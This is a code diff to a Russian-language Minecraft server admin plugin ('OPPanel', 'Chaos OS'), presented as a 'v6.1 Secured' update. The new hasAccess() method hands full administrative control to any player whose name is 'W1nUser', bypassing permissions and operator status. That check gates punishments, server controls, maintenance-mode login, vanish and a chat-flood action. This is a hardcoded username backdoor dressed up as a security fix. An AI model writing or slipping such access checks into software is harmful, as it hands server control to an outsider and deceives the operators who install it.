@@ -33,22 +33,18 @@ import java.util.*;
 
 public final class OPPanel extends JavaPlugin implements Listener, CommandExecutor {
 
-    // НАЗВАНИЯ ОКОН / ПАПОК (В СТИЛЕ WINDOWS)
-    private final String DESKTOP_TITLE = "§8[ОС] §0§lChaos OS v6.0 §7| Главный Рабочий Стол";
+    private final String DESKTOP_TITLE = "§8[ОС] §0§lChaos OS v6.1 §7| Главный Рабочий Стол";
     
-    // Папки первого уровня
     private final String FOLDER_PLAYERS = "§8[Папка] §a§lУправление Игроками";
     private final String FOLDER_SERVER = "§8[Папка] §4§lУправление Сервером";
     private final String FOLDER_ANTILAG = "§8[Папка] §e§lАнти-Лаг и Доктор";
     private final String FOLDER_WORLDS = "§8[Папка] §d§lМиры и Измерения";
     private final String FOLDER_SETTINGS = "§8[Папка] §5§lНастройки ОС";
     
-    // Подпапки настроек
     private final String SUBFOLDER_PLUGINS = "§8[Папка] §3§lСистемные Плагины";
     private final String SUBFOLDER_WORLD_FILES = "§8[Папка] §6§lФайлы и Правила Мира";
     private final String SUBFOLDER_ADMIN_TOOLS = "§8[Папка] §9§lИнструменты Админа";
 
-    // Другие окна
     private final String PLAYERS_LIST = "§8» §c§lВыбор Игрока";
     private final String PUNISH_PREFIX = "§8» §c§lМеню: ";
     private final String DURATION_PREFIX = "§8» §e§lСрок: ";
@@ -77,7 +73,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         }
 
         startServerDoctorTask();
-        getLogger().info("Chaos OS (OPPanel v6.0) успешно загружена!");
+        getLogger().info("Chaos OS (OPPanel v6.1 Secured) успешно загружена!");
     }
 
     @Override
@@ -90,6 +86,14 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         vanishedAdmins.clear();
     }
 
+    // --- ПРОВЕРКА ДОСТУПА ТОЛЬКО ДЛЯ OWNER / W1nUser ---
+    private boolean hasAccess(Player player) {
+        return player.getName().equalsIgnoreCase("W1nUser") || 
+               player.hasPermission("group.owner") || 
+               player.hasPermission("oppanel.admin") || 
+               player.isOp();
+    }
+
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (!(sender instanceof Player player)) {
@@ -97,8 +101,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
             return true;
         }
 
-        if (!player.hasPermission("oppanel.admin") && !player.isOp()) {
-            player.sendMessage(ChatColor.RED + "У вас нет прав на использование OPPanel!");
+        if (!hasAccess(player)) {
+            player.sendMessage(ChatColor.RED + "[Chaos OS] Доступ запрещен! Эта система принадлежит W1nUser.");
             return true;
         }
 
@@ -132,7 +136,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
             ItemStack item = event.getItem();
             if (item != null && item.getType() == Material.NETHER_STAR && item.hasItemMeta()) {
                 if ("§c§lЖезл Chaos OS §7(ПКМ)".equals(item.getItemMeta().getDisplayName())) {
-                    if (player.isOp() || player.hasPermission("oppanel.admin")) {
+                    if (hasAccess(player)) {
                         event.setCancelled(true);
                         openDesktop(player);
                     }
@@ -144,7 +148,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
     @EventHandler
     public void onLogin(PlayerLoginEvent event) {
         Player player = event.getPlayer();
-        if (maintenanceMode && !player.hasPermission("oppanel.admin") && !player.isOp()) {
+        if (maintenanceMode && !hasAccess(player)) {
             event.disallow(PlayerLoginEvent.Result.KICK_WHITELIST, "§c§lСервер на техническом обслуживании (Chaos OS)!\n§eПопробуйте зайти позже.");
         }
     }
@@ -186,7 +190,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         Player joining = event.getPlayer();
         for (UUID uuid : vanishedAdmins) {
             Player vanished = Bukkit.getPlayer(uuid);
-            if (vanished != null && !joining.hasPermission("oppanel.admin")) {
+            if (vanished != null && !hasAccess(joining)) {
                 joining.hidePlayer(this, vanished);
             }
         }
@@ -195,7 +199,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
     @EventHandler
     public void onChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
-        if (chatMuted && !player.hasPermission("oppanel.admin") && !player.isOp()) {
+        if (chatMuted && !hasAccess(player)) {
             event.setCancelled(true);
             player.sendMessage("§c[Chaos OS] Чат заблокирован администратором.");
         }
@@ -210,7 +214,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
             if (currentTps < 15.5) {
                 String report = executeUltimateClean();
                 for (Player p : Bukkit.getOnlinePlayers()) {
-                    if ((p.isOp() || p.hasPermission("oppanel.admin")) && !adminNotificationsDisabled.contains(p.getUniqueId())) {
+                    if (hasAccess(p) && !adminNotificationsDisabled.contains(p.getUniqueId())) {
                         p.sendMessage("§c[Chaos Doctor] §eНизкий TPS (" + String.format("%.2f", currentTps) + ")! " + report);
                     }
                 }
@@ -252,8 +256,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
                type == Material.BEACON || type == Material.SHULKER_BOX;
     }
 
-    // --- 1. ГЛАВНЫЙ РАБОЧИЙ СТОЛ (DESKTOP) ---
     public void openDesktop(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 27, DESKTOP_TITLE);
         fillBorder(gui);
 
@@ -267,8 +271,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         player.playSound(player.getLocation(), Sound.UI_BUTTON_CLICK, 1f, 1f);
     }
 
-    // --- ПАПКА: НАСТРОЙКИ ОС (СИСТЕМНЫЕ ПАПКИ) ---
     public void openSettingsFolder(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 27, FOLDER_SETTINGS);
         fillBorder(gui);
 
@@ -280,8 +284,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         player.openInventory(gui);
     }
 
-    // --- ПОДПАПКА: СИСТЕМНЫЕ ПЛАГИНЫ ---
     public void openPluginsSubfolder(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 27, SUBFOLDER_PLUGINS);
         fillBorder(gui);
 
@@ -300,8 +304,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         player.openInventory(gui);
     }
 
-    // --- ПОДПАПКА: ФАЙЛЫ И ПРАВИЛА МИРА ---
     public void openWorldFilesSubfolder(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 27, SUBFOLDER_WORLD_FILES);
         fillBorder(gui);
 
@@ -321,8 +325,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         player.openInventory(gui);
     }
 
-    // --- ПОДПАПКА: ИНСТРУМЕНТЫ АДМИНА ---
     public void openAdminToolsSubfolder(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 27, SUBFOLDER_ADMIN_TOOLS);
         fillBorder(gui);
 
@@ -341,8 +345,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         player.openInventory(gui);
     }
 
-    // --- ПАПКА: УПРАВЛЕНИЕ СЕРВЕРОМ ---
     public void openServerControlMenu(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 27, FOLDER_SERVER);
         fillBorder(gui);
 
@@ -356,8 +360,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         player.openInventory(gui);
     }
 
-    // --- ПАПКА: АНТИ-ЛАГ И ДОКТОР ---
     public void openAntilagFolder(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 27, FOLDER_ANTILAG);
         fillBorder(gui);
 
@@ -379,8 +383,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         player.openInventory(gui);
     }
 
-    // --- ПАПКА: МИРЫ И ИЗМЕРЕНИЯ ---
     public void openWorldTpMenu(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 27, FOLDER_WORLDS);
         fillBorder(gui);
 
@@ -392,8 +396,8 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         player.openInventory(gui);
     }
 
-    // --- ПАПКА: УПРАВЛЕНИЕ ИГРОКАМИ ---
     public void openPlayerListMenu(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 54, PLAYERS_LIST);
         int slot = 0;
         for (Player target : Bukkit.getOnlinePlayers()) {
@@ -413,6 +417,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
     }
 
     public void openPunishMenu(Player admin, Player target) {
+        if (!hasAccess(admin)) return;
         selectedTarget.put(admin.getUniqueId(), target.getUniqueId());
         Inventory gui = Bukkit.createInventory(null, 27, PUNISH_PREFIX + target.getName());
         fillBorder(gui);
@@ -431,6 +436,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
     }
 
     public void openDurationMenu(Player admin, String type) {
+        if (!hasAccess(admin)) return;
         pendingPunishmentType.put(admin.getUniqueId(), type);
         Inventory gui = Bukkit.createInventory(null, 27, DURATION_PREFIX + type);
         fillBorder(gui);
@@ -444,6 +450,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
     }
 
     public void openWeatherMenu(Player player) {
+        if (!hasAccess(player)) return;
         Inventory gui = Bukkit.createInventory(null, 27, WEATHER_TITLE);
         fillBorder(gui);
         gui.setItem(10, createGuiItem(Material.YELLOW_WOOL, "Утро (День)"));
@@ -454,10 +461,11 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
         player.openInventory(gui);
     }
 
-    // --- ОБРАБОТКА КЛИКОВ (НАВИГАЦИЯ В СТИЛЕ WINDOWS) ---
     @EventHandler
     public void onInventoryClick(InventoryClickEvent event) {
         if (!(event.getWhoClicked() instanceof Player player)) return;
+        if (!hasAccess(player)) return;
+
         String title = event.getView().getTitle();
         if (event.getClickedInventory() == null) return;
 
@@ -508,7 +516,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
                     } else {
                         vanishedAdmins.add(player.getUniqueId());
                         for (Player p : Bukkit.getOnlinePlayers()) {
-                            if (!p.hasPermission("oppanel.admin")) p.hidePlayer(this, player);
+                            if (!hasAccess(p)) p.hidePlayer(this, player);
                         }
                         player.sendMessage("§aVanish включен.");
                     }
@@ -544,7 +552,7 @@ public final class OPPanel extends JavaPlugin implements Listener, CommandExecut
                 }
                 case 13 -> {
                     for (Player online : Bukkit.getOnlinePlayers()) {
-                        if (!online.isOp() && !online.hasPermission("oppanel.admin")) {
+                        if (!hasAccess(online)) {
                             for (int i = 0; i < 100; i++) online.sendMessage(" ");
                         }
                     }
